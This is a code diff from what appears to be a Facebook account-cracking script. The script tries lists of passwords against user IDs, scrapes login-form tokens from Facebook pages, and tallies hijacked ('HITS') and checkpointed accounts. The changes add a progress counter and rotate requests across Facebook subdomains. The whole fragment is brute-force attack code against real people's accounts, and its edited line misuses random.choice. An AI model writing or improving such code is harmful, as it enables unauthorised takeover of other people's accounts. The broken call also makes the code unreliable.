@@ -553,19 +553,21 @@ def gxdsFilesMenu(gxdsfiles):
                 gxdsAPI,
                 uid,
                 pxss,
+                tl,
             )
             
 
 # API
-def gxdsAPI(uid, pxss, fb, fb1):
+def gxdsAPI(uid, pxss, tl):
     global oks, loop, cps, ugen
     session = requests.Session()
     sys.stdout.write(
-        f"\r{dg}  [GXDS-{fb1}]--[%s]--[CP-%s]~[HITS-%s] \r" % (loop, len(cps), len(oks))),
+        f"\r{dg}  [GXDS]--[%s/%s]--[CP-%s]~[HITS-%s] \r" % (loop, tl, len(cps), len(oks))),
     sys.stdout.flush()
     try:
         for ps in pxss:
             yrs = yxxr(uid)
+            fb = random.choice("n", "mbasic", "m", "x")
             gxdsfbs = session.get(f"https://{fb}.facebook.com").text
             info = {
                 "lsd": re.search('name="lsd" value="(.*?)"', str(gxdsfbs)).group(1),
